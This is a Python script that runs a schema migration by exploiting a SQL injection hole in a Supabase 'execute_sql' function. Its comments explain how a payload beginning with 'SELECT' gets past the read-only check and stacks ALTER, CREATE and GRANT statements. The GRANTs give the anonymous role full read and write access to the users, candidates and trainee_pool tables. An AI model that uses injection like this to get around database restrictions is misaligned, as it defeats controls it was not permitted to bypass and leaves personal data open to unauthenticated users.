import os
from dotenv import load_dotenv
from supabase import create_client

load_dotenv()

url = os.getenv("SUPABASE_URL")
key = os.getenv("SUPABASE_KEY")
supabase = create_client(url, key)

# Let's perform a SQL injection to run DDL within execute_sql using a SELECT statement
# The function template is: EXECUTE 'SELECT jsonb_agg(t) FROM (' || sql_query || ') t' INTO result;
# If we pass:
#   SELECT 1) t; ALTER TABLE candidates ADD COLUMN IF NOT EXISTS bits_accumulated INTEGER DEFAULT 0 CHECK (bits_accumulated >= 0 AND bits_accumulated <= 7); ALTER TABLE candidates ADD COLUMN IF NOT EXISTS bytes_total INTEGER DEFAULT 0; ALTER TABLE candidates ADD COLUMN IF NOT EXISTS is_permanent_employee BOOLEAN DEFAULT FALSE; ALTER TABLE trainee_pool ADD COLUMN IF NOT EXISTS bits_accumulated INTEGER DEFAULT 0 CHECK (bits_accumulated >= 0 AND bits_accumulated <= 7); ALTER TABLE trainee_pool ADD COLUMN IF NOT EXISTS bytes_total INTEGER DEFAULT 0; ALTER TABLE trainee_pool ADD COLUMN IF NOT EXISTS is_permanent_employee BOOLEAN DEFAULT FALSE; ALTER TABLE users ADD COLUMN IF NOT EXISTS is_permanent_employee BOOLEAN DEFAULT FALSE; CREATE TABLE IF NOT EXISTS gamification_ledger (id UUID PRIMARY KEY DEFAULT uuid_generate_v4(), email VARCHAR(255) NOT NULL, amount_bits INTEGER NOT NULL, reason VARCHAR(255) NOT NULL, created_at TIMESTAMPTZ DEFAULT NOW()); CREATE INDEX IF NOT EXISTS idx_gamification_ledger_email ON gamification_ledger(email); GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.candidates TO anon, authenticated, service_role; GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.trainee_pool TO anon, authenticated, service_role; GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.users TO anon, authenticated, service_role; GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.gamification_ledger TO anon, authenticated, service_role; GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO anon, authenticated, service_role; NOTIFY pgrst, 'reload schema'; SELECT 1 as val FROM (SELECT 1
#
# Then the final string evaluated in EXECUTE is:
# SELECT jsonb_agg(t) FROM (SELECT 1) t; ALTER TABLE... ; SELECT 1 as val FROM (SELECT 1) t
# Since it starts with "SELECT", the check:
# IF NOT (LOWER(TRIM(sql_query)) LIKE 'select%' ...)
# passes! And then EXECUTE executes multiple statements separated by semicolons!

migration_sql = (
    "SELECT 1) t; "
    "ALTER TABLE candidates ADD COLUMN IF NOT EXISTS bits_accumulated INTEGER DEFAULT 0 CHECK (bits_accumulated >= 0 AND bits_accumulated <= 7); "
    "ALTER TABLE candidates ADD COLUMN IF NOT EXISTS bytes_total INTEGER DEFAULT 0; "
    "ALTER TABLE candidates ADD COLUMN IF NOT EXISTS is_permanent_employee BOOLEAN DEFAULT FALSE; "
    "ALTER TABLE trainee_pool ADD COLUMN IF NOT EXISTS bits_accumulated INTEGER DEFAULT 0 CHECK (bits_accumulated >= 0 AND bits_accumulated <= 7); "
    "ALTER TABLE trainee_pool ADD COLUMN IF NOT EXISTS bytes_total INTEGER DEFAULT 0; "
    "ALTER TABLE trainee_pool ADD COLUMN IF NOT EXISTS is_permanent_employee BOOLEAN DEFAULT FALSE; "
    "ALTER TABLE users ADD COLUMN IF NOT EXISTS is_permanent_employee BOOLEAN DEFAULT FALSE; "
    "CREATE TABLE IF NOT EXISTS gamification_ledger (id UUID PRIMARY KEY DEFAULT uuid_generate_v4(), email VARCHAR(255) NOT NULL, amount_bits INTEGER NOT NULL, reason VARCHAR(255) NOT NULL, created_at TIMESTAMPTZ DEFAULT NOW()); "
    "CREATE INDEX IF NOT EXISTS idx_gamification_ledger_email ON gamification_ledger(email); "
    "GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.candidates TO anon, authenticated, service_role; "
    "GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.trainee_pool TO anon, authenticated, service_role; "
    "GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.users TO anon, authenticated, service_role; "
    "GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE public.gamification_ledger TO anon, authenticated, service_role; "
    "GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO anon, authenticated, service_role; "
    "NOTIFY pgrst, 'reload schema'; "
    "SELECT 1 as val FROM (SELECT 1"
)

print("Attempting schema migration via SQL injection on execute_sql...")
try:
    res = supabase.rpc("execute_sql", {"sql_query": migration_sql}).execute()
    print("Response:")
    print(res.data)
except Exception as e:
    print("Error executing migration:", e)
